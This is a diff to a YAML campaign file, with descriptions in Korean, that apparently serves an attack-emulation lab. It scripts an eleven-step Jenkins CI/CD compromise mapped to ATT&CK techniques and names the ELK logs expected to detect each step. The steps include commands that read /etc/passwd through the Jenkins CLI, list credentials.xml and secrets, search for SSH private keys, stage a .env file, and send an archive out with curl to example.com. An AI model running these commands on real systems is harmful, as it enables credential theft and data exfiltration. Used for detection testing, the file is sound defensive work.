@@ -1,29 +1,195 @@
 campaign_id: SB-01
 campaign_name: PipelineKey
-description: Jenkins에서 확보한 deploy key를 이용해 App 서버 SSH 접속과 App 운영 경로 탐색 행위를 재현한다.
+description: Jenkins 중심 CI/CD 침해 흐름을 11개 Techniques Used 기준으로 재현하고, 각 단계가 ELK에서 어떤 로그 근거로 확인되는지 검증한다.
 
 flow:
   - order: 1
+    phase: attack
+    module: attack.SB01_log_evidence
+    target: SB-01
+    name: Jenkins host and service information gathering
+    technique_id: T1592
+    params:
+      behavior: jenkins_host_recon
+      evidence_key: jenkins_host_recon
+      message: Jenkins 서비스와 컨트롤러 노출 단서를 확인하는 정찰 행위를 시뮬레이션한다.
+      commands:
+        - "curl -I http://jenkins:8080/"
+        - "java -jar jenkins-cli.jar -s http://jenkins:8080/ who-am-i"
+      artifacts:
+        - "JL-001 Jenkins access/controller log"
+        - "Jenkins 접근 흔적과 CLI 요청 단서"
+
+  - order: 2
+    phase: attack
+    module: attack.SB01_log_evidence
+    target: SB-01
+    name: Jenkins API token account usage
+    technique_id: T1078
+    depends_on_orders:
+      - 1
+    params:
+      behavior: jenkins_valid_account
+      evidence_key: jenkins_valid_account
+      message: 확보된 Jenkins API Token 또는 계정 기반 인증 사용을 시뮬레이션한다.
+      commands:
+        - "java -jar jenkins-cli.jar -s http://jenkins:8080/ -auth user:token who-am-i"
+      artifacts:
+        - "JL-001 Jenkins access/controller log"
+        - "정상 계정 기반 Jenkins CLI/API 사용 흔적"
+
+  - order: 3
+    phase: attack
+    module: attack.SB01_log_evidence
+    target: SB-01
+    name: Jenkins CLI file read behavior
+    technique_id: T1190
+    depends_on_orders:
+      - 2
+    params:
+      behavior: jenkins_cli_file_read
+      evidence_key: jenkins_cli_file_read
+      message: Jenkins CLI 파일 읽기 취약점 악용 흐름을 안전하게 시뮬레이션한다.
+      commands:
+        - "java -jar jenkins-cli.jar -s http://jenkins:8080/ connect-node @/etc/passwd"
+      artifacts:
+        - "JL-001 Jenkins access/controller log"
+        - "CLI 엔드포인트 접근 및 비정상 파일 읽기 시도 단서"
+
+  - order: 4
+    phase: attack
+    module: attack.SB01_log_evidence
+    target: SB-01
+    name: Jenkins job and repository information access
+    technique_id: T1213
+    depends_on_orders:
+      - 3
+    params:
+      behavior: jenkins_repository_read
+      evidence_key: jenkins_repository_read
+      message: Jenkins job/build 로그와 배포 설정에서 내부 저장소 정보를 확인하는 행위를 시뮬레이션한다.
+      commands:
+        - "find /var/jenkins_home/jobs -name config.xml -maxdepth 4"
+      artifacts:
+        - "JL-002 Jenkins build log"
+        - "job 이름, SCM URL, 배포 스크립트 단서"
+
+  - order: 5
+    phase: attack
+    module: attack.SB01_log_evidence
+    target: SB-01
+    name: Jenkins credential file discovery
+    technique_id: T1552.001
+    depends_on_orders:
+      - 4
+    params:
+      behavior: jenkins_credentials_file_access
+      evidence_key: jenkins_credentials_file_access
+      message: Jenkins 홈 디렉터리의 credentials.xml, secrets 경로 접근 행위를 시뮬레이션한다.
+      commands:
+        - "ls -la /var/jenkins_home/credentials.xml /var/jenkins_home/secrets/"
+      artifacts:
+        - "JL-002 Jenkins build log"
+        - "credentials.xml, secrets 경로 접근 단서"
+
+  - order: 6
+    phase: attack
+    module: attack.SB01_log_evidence
+    target: SB-01
+    name: Jenkins deploy private key discovery
+    technique_id: T1552.004
+    depends_on_orders:
+      - 5
+    params:
+      behavior: jenkins_private_key_discovery
+      evidence_key: jenkins_private_key_discovery
+      message: Jenkins 배포용 SSH private key 발견 및 사용 준비 행위를 시뮬레이션한다.
+      commands:
+        - "find /var/jenkins_home -name '*id_rsa*' -o -name '*.pem'"
+      artifacts:
+        - "JL-002 Jenkins build log"
+        - "배포 키 파일명 또는 credential binding 단서"
+
+  - order: 7
     phase: attack
     module: attack.T1021_004_ssh_remote_service
     target: SB-01
     name: Jenkins to App SSH using deploy key
     technique_id: T1021.004
+    depends_on_orders:
+      - 6
     params:
       behavior: jenkins_to_app_ssh
       username: deploy
       command: "hostname"
 
-  - order: 2
+  - order: 8
     phase: attack
     module: attack.T1083_file_directory_discovery
     target: SB-01
     name: App directory and config file discovery
     technique_id: T1083
     depends_on_orders:
-      - 1
+      - 7
     params:
       behavior: app_directory_discovery
       username: deploy
       base_path: /opt/spacebar-booking
       max_depth: 2
+
+  - order: 9
+    phase: attack
+    module: attack.SB01_log_evidence
+    target: SB-01
+    name: Booking database query from App context
+    technique_id: T1213.006
+    depends_on_orders:
+      - 8
+    params:
+      behavior: db_postgresql_access
+      evidence_key: db_postgresql_access
+      message: App 서버에서 PostgreSQL booking 데이터베이스 조회 행위를 시뮬레이션한다.
+      commands:
+        - "psql postgresql://spacebar@db:5432/spacebar_booking -c 'select count(*) from bookings;'"
+      artifacts:
+        - "DBL-001 PostgreSQL connection/query log"
+        - "database=spacebar_booking 연결 흔적"
+
+  - order: 10
+    phase: attack
+    module: attack.SB01_log_evidence
+    target: SB-01
+    name: App local data staging
+    technique_id: T1074.001
+    depends_on_orders:
+      - 8
+      - 9
+    params:
+      behavior: app_local_data_staging
+      evidence_key: app_local_data_staging
+      message: App 운영 경로에서 수집한 파일과 DB 결과를 임시 경로로 모으는 행위를 시뮬레이션한다.
+      commands:
+        - "mkdir -p /tmp/sb01-stage && cp /opt/spacebar-booking/.env /tmp/sb01-stage/"
+      artifacts:
+        - "LL-002 Linux auditd file access log"
+        - "운영 경로 접근 이후 staging 전 단계 확인"
+      notes:
+        - "현재 ELK 검증은 /opt/spacebar-booking 접근 로그를 staging 선행 근거로 사용한다."
+
+  - order: 11
+    phase: attack
+    module: attack.SB01_log_evidence
+    target: SB-01
+    name: Exfiltration over HTTPS-like outbound flow
+    technique_id: T1048.002
+    depends_on_orders:
+      - 10
+    params:
+      behavior: aws_vpc_app_outbound_443
+      evidence_key: aws_vpc_app_outbound_443
+      message: App 서버에서 외부 HTTPS 목적지로 데이터 전송을 시도하는 흐름을 시뮬레이션한다.
+      commands:
+        - "curl -sS https://example.com/upload --data-binary @/tmp/sb01-stage/archive.tar.gz"
+      artifacts:
+        - "AWSL-001 VPC Flow Log"
+        - "App 서버 source.ip에서 destination.port 443 outbound ACCEPT"
